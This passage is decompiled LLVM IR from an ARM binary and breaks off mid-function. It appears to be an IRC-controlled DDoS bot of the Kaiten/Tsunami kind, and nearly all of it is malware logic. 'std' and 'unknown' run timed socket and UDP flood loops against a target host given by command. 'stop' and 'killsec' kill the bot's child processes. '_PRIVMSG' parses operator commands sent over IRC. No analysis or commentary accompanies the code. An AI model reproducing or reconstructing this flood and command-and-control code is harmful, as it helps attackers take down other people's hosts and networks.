  %v7_8d80 = icmp slt i32 %v0_8d60, 20
  br i1 %v7_8d80, label %dec_label_pc_8d8c, label %dec_label_pc_8d84

dec_label_pc_8d84:                                ; preds = %dec_label_pc_8d78, %dec_label_pc_8d44
  %v1_8d88 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8d8c

dec_label_pc_8d8c:                                ; preds = %dec_label_pc_8d78, %dec_label_pc_8d84
  %v2_8d9c = add i32 %v13_8b08, -1084
  %v2_8da0 = add i32 %v2_8d9c, %v0_8d60
  %v3_8da8 = inttoptr i32 %v2_8da0 to i8*
  store i8 0, i8* %v3_8da8, align 1
  %v1_8db0 = add i32 %v13_8b08, -1
  %v2_8dc0 = add i32 %v1_8db0, %v0_8d60
  %v2_8dc4 = add i32 %v2_8dc0, -1084
  %v1_8dc8 = inttoptr i32 %v2_8dc4 to i8*
  %v2_8dc8 = load i8, i8* %v1_8dc8, align 1
  %v7_8dcc = icmp eq i8 %v2_8dc8, 10
  br i1 %v7_8dcc, label %dec_label_pc_8dfc, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8d8c
  %v2_8df0 = load i8, i8* %v1_8dc8, align 1
  %v7_8df4 = icmp eq i8 %v2_8df0, 13
  br i1 %v7_8df4, label %dec_label_pc_8dfc, label %dec_label_pc_8e20

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8dd4, %dec_label_pc_8d8c
  store i8 0, i8* %v1_8dc8, align 1
  br label %dec_label_pc_8e20

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8dd4, %dec_label_pc_8dfc
  %v1_8e24 = add i32 %v13_8b08, -2
  %v2_8e34 = add i32 %v1_8e24, %v0_8d60
  %v2_8e38 = add i32 %v2_8e34, -1084
  %v1_8e3c = inttoptr i32 %v2_8e38 to i8*
  %v2_8e3c = load i8, i8* %v1_8e3c, align 1
  %v7_8e40 = icmp eq i8 %v2_8e3c, 10
  br i1 %v7_8e40, label %dec_label_pc_8e70, label %dec_label_pc_8e48

dec_label_pc_8e48:                                ; preds = %dec_label_pc_8e20
  %v2_8e64 = load i8, i8* %v1_8e3c, align 1
  %v7_8e68 = icmp eq i8 %v2_8e64, 13
  br i1 %v7_8e68, label %dec_label_pc_8e70, label %dec_label_pc_8e94

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e48, %dec_label_pc_8e20
  store i8 0, i8* %v1_8e3c, align 1
  br label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8e48, %dec_label_pc_8e70
  %v4_8eb8 = call i32 @Send(i32 %v0_8be4, i32 ptrtoint ([25 x i8]* @global_var_1c414.60 to i32), i32 %v2_8d4c)
  store i32 %v0_8be4, i32* @r0, align 4
  %v0_8ec0 = call i32 @close()
  store i32 %v0_8b24, i32* @r0, align 4
  %v0_8ec8 = call i32 @close()
  %v1_8ed0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8ed4

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8bbc, %dec_label_pc_8ba4, %dec_label_pc_8b3c, %entry, %dec_label_pc_8e94
  %v9_8ed8 = phi i32 [ 0, %dec_label_pc_8bbc ], [ %v0_8bac, %dec_label_pc_8ba4 ], [ %v0_8b94, %dec_label_pc_8b3c ], [ %v0_8b24, %entry ], [ %v1_8ed0, %dec_label_pc_8e94 ]
  ret i32 %v9_8ed8

; uselistorder directives
  uselistorder i8* %v1_8e3c, { 1, 0, 2 }
  uselistorder i8* %v1_8dc8, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8d20, { 2, 0, 1 }
  uselistorder i32 %v1_8c78, { 1, 0 }
  uselistorder i32 %v2_8c0c, { 1, 0 }
  uselistorder i32 %v0_8be4, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v0_8bac, { 1, 0 }
  uselistorder i32 %v0_8b94, { 1, 0 }
  uselistorder i32 %v0_8b24, { 1, 2, 3, 0 }
  uselistorder i32 %v13_8b08, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 -1084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8ed4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8e94, { 1, 0 }
  uselistorder label %dec_label_pc_8e20, { 1, 0 }
  uselistorder label %dec_label_pc_8d8c, { 1, 0 }
  uselistorder label %dec_label_pc_8d00, { 1, 0 }
  uselistorder label %dec_label_pc_8c20, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36592, i32* %stack_var_-4, align 4
  %v2_8eec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8eec, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-68, align 4
  %v8_8f0c = icmp sgt i32 %arg3, 2
  br i1 %v8_8f0c, label %dec_label_pc_8f30, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %entry
  %v2_8f14 = load i32, i32* @global_var_2f550.62, align 4
  %v4_8f24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1c430.64 to i32), i32 %v2_8f14)
  %v1_8f2c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8f30

dec_label_pc_8f30:                                ; preds = %entry, %dec_label_pc_8f10
  %v0_8f3c = call i32 @socket()
  %v2_8f4c = call i32 @__GI_time(i32* null)
  %v3_8f58 = load i32, i32* %stack_var_-68, align 4
  %v1_8f5c = add i32 %v3_8f58, 12
  %v1_8f60 = inttoptr i32 %v1_8f5c to i32*
  %v2_8f60 = load i32, i32* %v1_8f60, align 4
  store i32 %v2_8f60, i32* @r0, align 4
  %v1_8f68 = call i32 @atol(i32 %v2_8f60)
  %v1_8f78 = call i32 @mfork(i32 %arg2)
  %v2_8f80 = icmp eq i32 %v1_8f78, 0
  br i1 %v2_8f80, label %dec_label_pc_8f88, label %dec_label_pc_90f4

dec_label_pc_8f88:                                ; preds = %dec_label_pc_8f30
  %v2_8f8c = load i32, i32* @global_var_2f550.62, align 4
  %v4_8fa4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1c460.66 to i32), i32 %v2_8f8c)
  %v3_8fa8 = load i32, i32* %stack_var_-68, align 4
  %v1_8fac = add i32 %v3_8fa8, 4
  %v1_8fb0 = inttoptr i32 %v1_8fac to i32*
  %v2_8fb0 = load i32, i32* %v1_8fb0, align 4
  %v1_8fb8 = call i32 @__GI_gethostbyname(i32 %v2_8fb0)
  %v2_8fc4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  store i32 %v2_8fc4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_8fd4 = call i32 @__GI_memset()
  %v1_8fdc = add i32 %v1_8fb8, 16
  %v2_8fdc = inttoptr i32 %v1_8fdc to i32*
  %v3_8fdc = load i32, i32* %v2_8fdc, align 4
  %v1_8fe0 = inttoptr i32 %v3_8fdc to i32*
  %v2_8fe0 = load i32, i32* %v1_8fe0, align 4
  %v2_8fe8 = ptrtoint i32* %stack_var_-48 to i32
  %v1_8ff0 = add i32 %v1_8fb8, 12
  %v2_8ff0 = inttoptr i32 %v1_8ff0 to i32*
  %v3_8ff0 = load i32, i32* %v2_8ff0, align 4
  store i32 %v3_8ff0, i32* @r2, align 4
  %v3_9000 = call i32 @bcopy(i32 %v2_8fe0, i32 %v2_8fe8, i32 %v3_8ff0)
  %v1_9008 = add i32 %v1_8fb8, 8
  %v2_9008 = inttoptr i32 %v1_9008 to i32*
  %v3_9008 = load i32, i32* %v2_9008, align 4
  %v3_9010 = urem i32 %v3_9008, 65536
  store i32 %v3_9010, i32* %stack_var_-52, align 4
  %v3_9020 = load i32, i32* %stack_var_-68, align 4
  %v1_9024 = add i32 %v3_9020, 8
  %v1_9028 = inttoptr i32 %v1_9024 to i32*
  %v2_9028 = load i32, i32* %v1_9028, align 4
  store i32 %v2_9028, i32* @r0, align 4
  %v1_9030 = call i32 @atol(i32 %v2_9028)
  %v2_90a0 = add i32 %v1_8f68, %v2_8f4c
  br label %dec_label_pc_9054

dec_label_pc_9054:                                ; preds = %dec_label_pc_90e4, %dec_label_pc_8f88
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8f88 ], [ %v1_90e8, %dec_label_pc_90e4 ]
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_90e4, label %dec_label_pc_9060

dec_label_pc_9060:                                ; preds = %dec_label_pc_9054
  store i32 %v0_8f3c, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c480.68 to i32), i32* @r1, align 4
  store i32 50, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_9070 = call i32 @send()
  store i32 %v0_8f3c, i32* @r0, align 4
  store i32 %v2_8fc4, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_9084 = call i32 @connect()
  %v2_908c = call i32 @__GI_time(i32* null)
  %v3_90a4 = icmp ult i32 %v2_908c, %v2_90a0
  br i1 %v3_90a4, label %dec_label_pc_90dc, label %dec_label_pc_90ac

dec_label_pc_90ac:                                ; preds = %dec_label_pc_9060
  %v2_90b0 = load i32, i32* @global_var_2f550.62, align 4
  %v4_90c8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1c484.70 to i32), i32 %v2_90b0)
  store i32 %v0_8f3c, i32* @r0, align 4
  %v0_90d0 = call i32 @close()
  %v1_90d8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_90dc

dec_label_pc_90dc:                                ; preds = %dec_label_pc_9060, %dec_label_pc_90ac
  br label %dec_label_pc_90e4

dec_label_pc_90e4:                                ; preds = %dec_label_pc_9054, %dec_label_pc_90dc
  %stack_var_-20.0 = phi i32 [ %storemerge3, %dec_label_pc_9054 ], [ 0, %dec_label_pc_90dc ]
  %v1_90e8 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_9054

dec_label_pc_90f4:                                ; preds = %dec_label_pc_8f30
  ret i32 %v1_8f78

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_8ff0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_90e4, { 1, 0 }
  uselistorder label %dec_label_pc_90dc, { 1, 0 }
  uselistorder label %dec_label_pc_8f30, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37148, i32* %stack_var_-4, align 4
  %v2_9118 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9118, i32* @fp, align 4
  %v0_9120 = load i32, i32* %r0.global-to-local, align 4
  %v2_9190 = icmp eq i32 %arg2, 0
  %v2_920414 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_920c16 = icmp eq i32 %v2_920414, 0
  br i1 %v3_920c16, label %dec_label_pc_9214, label %dec_label_pc_913c

dec_label_pc_913c:                                ; preds = %dec_label_pc_91f4, %entry
  %storemerge122 = phi i32 [ %v1_91f8, %dec_label_pc_91f4 ], [ 0, %entry ]
  %v12_921821 = phi i32 [ %v12_92182, %dec_label_pc_91f4 ], [ %v0_9120, %entry ]
  %v3_9140 = mul i32 %storemerge122, 4
  %v2_914c = load i32, i32* @global_var_2f554.52, align 4
  %v2_9150 = add i32 %v2_914c, %v3_9140
  %v1_9154 = inttoptr i32 %v2_9150 to i32*
  %v2_9154 = load i32, i32* %v1_9154, align 4
  %v2_9158 = icmp eq i32 %v2_9154, 0
  br i1 %v2_9158, label %dec_label_pc_91f4, label %dec_label_pc_9160

dec_label_pc_9160:                                ; preds = %dec_label_pc_913c
  %v2_9178 = load i32, i32* %v1_9154, align 4
  store i32 %v2_9178, i32* @r4, align 4
  %v0_917c = call i32 @__libc_getpid()
  store i32 %v0_917c, i32* %r0.global-to-local, align 4
  %v0_9184 = load i32, i32* @r4, align 4
  %v9_9184 = icmp eq i32 %v0_9184, %v0_917c
  br i1 %v9_9184, label %dec_label_pc_91f4, label %dec_label_pc_918c

dec_label_pc_918c:                                ; preds = %dec_label_pc_9160
  br i1 %v2_9190, label %dec_label_pc_91cc, label %dec_label_pc_9198

dec_label_pc_9198:                                ; preds = %dec_label_pc_918c
  %v2_919c = load i32, i32* @global_var_2f550.62, align 4
  store i32 %v0_9120, i32* %r0.global-to-local, align 4
  %v4_91c8 = call i32 @Send(i32 %v0_9120, i32 ptrtoint ([29 x i8]* @global_var_1c4a8.74 to i32), i32 %v2_919c)
  store i32 %v4_91c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91cc

dec_label_pc_91cc:                                ; preds = %dec_label_pc_918c, %dec_label_pc_9198
  %v2_91dc = load i32, i32* @global_var_2f554.52, align 4
  %v2_91e0 = add i32 %v2_91dc, %v3_9140
  %v1_91e4 = inttoptr i32 %v2_91e0 to i32*
  %v2_91e4 = load i32, i32* %v1_91e4, align 4
  store i32 %v2_91e4, i32* %r0.global-to-local, align 4
  %v0_91f0 = call i32 @kill()
  store i32 %v0_91f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_9160, %dec_label_pc_913c, %dec_label_pc_91cc
  %v12_92182 = phi i32 [ %v0_917c, %dec_label_pc_9160 ], [ %v12_921821, %dec_label_pc_913c ], [ %v0_91f0, %dec_label_pc_91cc ]
  %v1_91f8 = add i32 %storemerge122, 1
  %v2_9204 = load i32, i32* @global_var_2ac28.50, align 4
  %v3_920c = icmp ult i32 %v1_91f8, %v2_9204
  br i1 %v3_920c, label %dec_label_pc_913c, label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91f4, %entry
  %v12_9218.lcssa = phi i32 [ %v0_9120, %entry ], [ %v12_92182, %dec_label_pc_91f4 ]
  ret i32 %v12_9218.lcssa

; uselistorder directives
  uselistorder i32 %v1_91f8, { 1, 0 }
  uselistorder i32 %v3_9140, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_9120, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 0, 1 }
  uselistorder label %dec_label_pc_91f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_91cc, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37432, i32* %stack_var_-4, align 4
  %v2_9234 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9234, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_9258 = call i32 @malloc(i32 9216)
  %v2_9268 = call i32 @__GI_time(i32* null)
  %v1_9278 = call i32 @mfork(i32 %arg2)
  %v2_9280 = icmp eq i32 %v1_9278, 0
  br i1 %v2_9280, label %dec_label_pc_9288, label %dec_label_pc_9454

dec_label_pc_9288:                                ; preds = %entry
  %v7_928c = icmp eq i32 %arg3, 2
  br i1 %v7_928c, label %dec_label_pc_92b4, label %dec_label_pc_9294

dec_label_pc_9294:                                ; preds = %dec_label_pc_9288
  %v2_9298 = load i32, i32* @global_var_2f550.62, align 4
  %v4_92a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_1c4c8.78 to i32), i32 %v2_9298)
  %v1_92b0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_92b4

dec_label_pc_92b4:                                ; preds = %dec_label_pc_9288, %dec_label_pc_9294
  %v1_92b8 = add i32 %arg4, 8
  %v1_92bc = inttoptr i32 %v1_92b8 to i32*
  %v2_92bc = load i32, i32* %v1_92bc, align 4
  store i32 %v2_92bc, i32* @r0, align 4
  %v1_92c4 = call i32 @atol(i32 %v2_92bc)
  %v1_9304 = add i32 %arg4, 4
  %v1_9308 = inttoptr i32 %v1_9304 to i32*
  %v2_9308 = load i32, i32* %v1_9308, align 4
  %v3_9314 = call i32 @host2ip(i32 %arg2, i32 %v2_9308, i32 0)
  %v2_9334 = load i32, i32* @global_var_2f550.62, align 4
  %v4_934c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1c4f4.80 to i32), i32 %v2_9334)
  %v2_9400 = add i32 %v1_92c4, %v2_9268
  %v2_9398 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_9350

dec_label_pc_9350:                                ; preds = %dec_label_pc_9414, %dec_label_pc_92b4
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_92b4 ], [ %v1_9418, %dec_label_pc_9414 ]
  %v0_9350 = call i32 @random()
  %v0_9378 = call i32 @socket()
  %v1_9388 = icmp slt i32 %v0_9378, 0
  br i1 %v1_9388, label %dec_label_pc_93dc, label %dec_label_pc_9390

dec_label_pc_9390:                                ; preds = %dec_label_pc_9350
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %v0_9378, i32* @r0, align 4
  %v3_93ac = call i32 @ioctl(i32 %v0_9378, i32 21537, i32 %v2_9398)
  store i32 %v0_9378, i32* @r0, align 4
  store i32 %v1_9258, i32* @r1, align 4
  store i32 9216, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_93d0 = call i32 @sendto()
  store i32 %v0_9378, i32* @r0, align 4
  %v0_93d8 = call i32 @close()
  br label %dec_label_pc_93dc

dec_label_pc_93dc:                                ; preds = %dec_label_pc_9350, %dec_label_pc_9390
  %v7_93e4 = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_93e4, label %dec_label_pc_9414, label %dec_label_pc_93e8

dec_label_pc_93e8:                                ; preds = %dec_label_pc_93dc
  %v2_93ec = call i32 @__GI_time(i32* null)
  %v3_9404 = icmp ult i32 %v2_93ec, %v2_9400
  br i1 %v3_9404, label %dec_label_pc_940c, label %dec_label_pc_9424

dec_label_pc_940c:                                ; preds = %dec_label_pc_93e8
  br label %dec_label_pc_9414

dec_label_pc_9414:                                ; preds = %dec_label_pc_93dc, %dec_label_pc_940c
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_93dc ], [ 0, %dec_label_pc_940c ]
  %v1_9418 = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_9350

dec_label_pc_9424:                                ; preds = %dec_label_pc_93e8
  %v2_9428 = load i32, i32* @global_var_2f550.62, align 4
  %v4_9440 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1c514.82 to i32), i32 %v2_9428)
  store i32 %v0_9378, i32* @r0, align 4
  %v0_9448 = call i32 @close()
  %v1_9450 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %entry, %dec_label_pc_9424
  %v9_9458 = phi i32 [ %v1_9278, %entry ], [ %v1_9450, %dec_label_pc_9424 ]
  ret i32 %v9_9458

; uselistorder directives
  uselistorder i32 %v0_9378, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 1, 2, 0 }
  uselistorder i32 (i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder i32 9216, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9454, { 1, 0 }
  uselistorder label %dec_label_pc_9414, { 1, 0 }
  uselistorder label %dec_label_pc_93dc, { 1, 0 }
  uselistorder label %dec_label_pc_92b4, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38008, i32* %stack_var_-4, align 4
  %v2_9474 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9474, i32* @fp, align 4
  %v2_9490 = load i32, i32* bitcast ([2 x i8*]* @global_var_2635c.86 to i32*), align 4
  %tmp9 = inttoptr i32 %v2_9490 to i8*
  %v4_949c = call i32 @__GI_strcasecmp(i8* %tmp9, i32 %arg2)
  %v2_94a4 = icmp eq i32 %v4_949c, 0
  br i1 %v2_94a4, label %dec_label_pc_94ac, label %dec_label_pc_94bc

dec_label_pc_94ac:                                ; preds = %entry
  %v0_94b4 = call i32 @kill()
  br label %dec_label_pc_94d4

dec_label_pc_94bc:                                ; preds = %entry
  %v2_94c0 = load i32, i32* @global_var_2f550.62, align 4
  %v4_94d0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_1c538.89 to i32), i32 %v2_94c0)
  br label %dec_label_pc_94d4

dec_label_pc_94d4:                                ; preds = %dec_label_pc_94ac, %dec_label_pc_94bc
  %storemerge = phi i32 [ %v4_94d0, %dec_label_pc_94bc ], [ %v0_94b4, %dec_label_pc_94ac ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_94d4, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp32 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-1124 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_94ec = load i32, i32* @r4, align 4
  store i32 %v3_94ec, i32* %stack_var_-20, align 4
  store i32 38132, i32* %stack_var_-4, align 4
  %v16_94ec = ptrtoint i32* %stack_var_-20 to i32
  %v2_94f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_94f0, i32* @fp, align 4
  store i8* %tmp, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_951c

dec_label_pc_9510:                                ; preds = %dec_label_pc_9534
  %v1_9514 = add i32 %storemerge11, 1
  br label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %entry, %dec_label_pc_9510
  %v3_9520 = phi i8* [ %tmp, %entry ], [ %v3_953c, %dec_label_pc_9510 ]
  %storemerge11 = phi i32 [ 0, %entry ], [ %v1_9514, %dec_label_pc_9510 ]
  %v4_9520 = ptrtoint i8* %v3_9520 to i32
  store i32 %v4_9520, i32* %r0.global-to-local, align 4
  %v3_9524 = call i32 @strlen(i8* %v3_9520)
  store i32 %v3_9524, i32* %r0.global-to-local, align 4
  %v3_952c = icmp ult i32 %storemerge11, %v3_9524
  br i1 %v3_952c, label %dec_label_pc_9534, label %dec_label_pc_951c.dec_label_pc_9550_crit_edge

dec_label_pc_951c.dec_label_pc_9550_crit_edge:    ; preds = %dec_label_pc_951c
  %v3_9558.pre = load i8*, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_9550

dec_label_pc_9534:                                ; preds = %dec_label_pc_951c
  %v3_953c = load i8*, i8** %stack_var_-1124, align 4
  %v4_953c = ptrtoint i8* %v3_953c to i32
  %v2_9540 = add i32 %v4_953c, %storemerge11
  %v1_9544 = inttoptr i32 %v2_9540 to i8*
  %v2_9544 = load i8, i8* %v1_9544, align 1
  %v7_9548 = icmp eq i8 %v2_9544, 32
  br i1 %v7_9548, label %dec_label_pc_9550, label %dec_label_pc_9510

dec_label_pc_9550:                                ; preds = %dec_label_pc_9534, %dec_label_pc_951c.dec_label_pc_9550_crit_edge
  %v3_9558 = phi i8* [ %v3_9558.pre, %dec_label_pc_951c.dec_label_pc_9550_crit_edge ], [ %v3_953c, %dec_label_pc_9534 ]
  %v4_9558 = ptrtoint i8* %v3_9558 to i32
  %v2_955c = add i32 %v4_9558, %storemerge11
  %v3_9564 = inttoptr i32 %v2_955c to i8*
  store i8 0, i8* %v3_9564, align 1
  %v3_9568 = load i8*, i8** %stack_var_-1124, align 4
  %v4_9578 = ptrtoint i8* %v3_9568 to i32
  %v2_957c = add i32 %v4_9578, %storemerge11
  %v1_9580 = add i32 %v2_957c, 2
  %v5_9584 = inttoptr i32 %v1_9580 to i8*
  br label %dec_label_pc_95a0

dec_label_pc_9594:                                ; preds = %dec_label_pc_95b8
  %v1_9598 = add i32 %storemerge12, 1
  br label %dec_label_pc_95a0

dec_label_pc_95a0:                                ; preds = %dec_label_pc_9550, %dec_label_pc_9594
  %storemerge12 = phi i32 [ 0, %dec_label_pc_9550 ], [ %v1_9598, %dec_label_pc_9594 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %v3_95a8 = call i32 @strlen(i8* %arg2)
  store i32 %v3_95a8, i32* %r0.global-to-local, align 4
  %v0_95b0 = load i32, i32* @r4, align 4
  %v3_95b0 = icmp ult i32 %v0_95b0, %v3_95a8
  br i1 %v3_95b0, label %dec_label_pc_95b8, label %dec_label_pc_95a0.dec_label_pc_95d4_crit_edge

dec_label_pc_95a0.dec_label_pc_95d4_crit_edge:    ; preds = %dec_label_pc_95a0
  %.pre = add i32 %storemerge12, %tmp32
  %.pre26 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_95d4

dec_label_pc_95b8:                                ; preds = %dec_label_pc_95a0
  %v2_95c4 = add i32 %storemerge12, %tmp32
  %v1_95c8 = inttoptr i32 %v2_95c4 to i8*
  %v2_95c8 = load i8, i8* %v1_95c8, align 1
  %v7_95cc = icmp eq i8 %v2_95c8, 33
  br i1 %v7_95cc, label %dec_label_pc_95d4, label %dec_label_pc_9594

dec_label_pc_95d4:                                ; preds = %dec_label_pc_95b8, %dec_label_pc_95a0.dec_label_pc_95d4_crit_edge
  %v3_95e8.pre-phi = phi i8* [ %.pre26, %dec_label_pc_95a0.dec_label_pc_95d4_crit_edge ], [ %v1_95c8, %dec_label_pc_95b8 ]
  store i8 0, i8* %v3_95e8.pre-phi, align 1
  %v2_95f0 = load i8, i8* %v5_9584, align 1
  %v7_95f4 = icmp eq i8 %v2_95f0, 62
  br i1 %v7_95f4, label %dec_label_pc_95fc, label %dec_label_pc_9a30

dec_label_pc_95fc:                                ; preds = %dec_label_pc_95d4
  %v2_9600 = load i32, i32* @global_var_2f550.62, align 4
  store i32 %v4_9578, i32* %r0.global-to-local, align 4
  %v4_960c = call i32 @__GI_strcasecmp(i8* %v3_9568, i32 %v2_9600)
  store i32 %v4_960c, i32* %r0.global-to-local, align 4
  %v2_9614 = icmp eq i32 %v4_960c, 0
  br i1 %v2_9614, label %dec_label_pc_961c, label %dec_label_pc_9a30

dec_label_pc_961c:                                ; preds = %dec_label_pc_95fc
  %v2_9620 = ptrtoint i32* %stack_var_-1112 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_9620, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_9630 = call i32 @__GI_memset()
  store i32 %v0_9630, i32* %r0.global-to-local, align 4
  %v1_9640 = add i32 %v2_957c, 3
  %v5_9644 = inttoptr i32 %v1_9640 to i8*
  br label %dec_label_pc_9660

dec_label_pc_9654:                                ; preds = %dec_label_pc_9678
  %v1_9658 = add i32 %storemerge13, 1
  br label %dec_label_pc_9660

dec_label_pc_9660:                                ; preds = %dec_label_pc_961c, %dec_label_pc_9654
  %storemerge13 = phi i32 [ 0, %dec_label_pc_961c ], [ %v1_9658, %dec_label_pc_9654 ]
  store i32 %storemerge13, i32* @r4, align 4
  store i32 %v1_9640, i32* %r0.global-to-local, align 4
  %v3_9668 = call i32 @strlen(i8* %v5_9644)
  store i32 %v3_9668, i32* %r0.global-to-local, align 4
  %v0_9670 = load i32, i32* @r4, align 4
  %v3_9670 = icmp ult i32 %v0_9670, %v3_9668
  br i1 %v3_9670, label %dec_label_pc_9678, label %dec_label_pc_9660.dec_label_pc_9694_crit_edge

dec_label_pc_9660.dec_label_pc_9694_crit_edge:    ; preds = %dec_label_pc_9660
  %.pre27 = add i32 %storemerge13, %v1_9640
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_9694

dec_label_pc_9678:                                ; preds = %dec_label_pc_9660
  %v2_9684 = add i32 %storemerge13, %v1_9640
  %v1_9688 = inttoptr i32 %v2_9684 to i8*
  %v2_9688 = load i8, i8* %v1_9688, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9694, label %dec_label_pc_9654

dec_label_pc_9694:                                ; preds = %dec_label_pc_9678, %dec_label_pc_9660.dec_label_pc_9694_crit_edge
  %v3_96a8.pre-phi = phi i8* [ %.pre28, %dec_label_pc_9660.dec_label_pc_9694_crit_edge ], [ %v1_9688, %dec_label_pc_9678 ]
  %v2_96a0.pre-phi = phi i32 [ %.pre27, %dec_label_pc_9660.dec_label_pc_9694_crit_edge ], [ %v2_9684, %dec_label_pc_9678 ]
  store i8 0, i8* %v3_96a8.pre-phi, align 1
  %v2_96b4 = load i32, i32* @global_var_2f538.92, align 4
  store i32 %v1_9640, i32* %r0.global-to-local, align 4
  %v3_96c0 = call i32 @strwildmatch(i8* %v5_9644, i32 %v2_96b4)
